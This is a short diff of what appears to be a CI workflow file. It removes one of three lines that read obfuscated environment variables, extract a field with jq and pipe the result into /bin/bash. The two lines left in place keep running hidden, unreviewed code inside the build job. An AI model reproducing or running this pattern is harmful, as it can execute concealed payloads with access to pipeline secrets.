@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$sm54919" | jq -r .gck7093 | /bin/bash
           echo $l37 | jq -r .ncgxz11 | /bin/bash
-          echo $mqg365 | jq -r .q0 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
